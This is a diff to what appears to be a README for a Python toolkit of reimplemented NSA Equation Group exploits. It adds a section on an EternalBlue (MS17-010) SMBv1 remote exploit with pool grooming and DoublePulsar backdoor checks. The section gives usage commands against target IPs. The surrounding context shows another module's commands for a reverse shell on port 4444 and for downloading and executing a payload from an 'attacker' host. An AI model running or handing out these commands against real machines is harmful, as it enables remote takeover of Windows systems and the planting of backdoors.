@@ -73,3 +73,20 @@ pip install impacket
 nsa-equation-py netapi32-exp 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell
 nsa-equation-py netapi32-exp 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec
 ```
+
+### reternal-blue — MS17-010 (ETERNALBLUE) SMBv1 远程利用
+
+Python rewrite of the NSA EternalBlue exploit `Eternalblue-2.2.0.exe` (C++
+DAVE-framework) recovered via IDA Pro.  It drives the MS17-010 exploitation
+sequence over SMBv1 (TCP 445): SMB echo ping → architecture detection
+(x86/x64) → non-paged pool grooming → exploit buffer → optional DoublePulsar
+backdoor verify.  It also reimplements the tool's key=value parameter
+interface (`Target`, `TargetIp`, `TargetPort`, `NetworkTimeout`,
+`GroomAllocations`, `MaxExploitAttempts`, `VerifyTarget`, `VerifyBackdoor`).
+
+Dependency-free (stdlib raw SMBv1 client).
+
+```bash
+nsa-equation-py reternal-blue 192.168.1.5 -a x64 --verify-backdoor
+nsa-equation-py reternal-blue 192.168.1.5 --groom 400 -o win7
+```
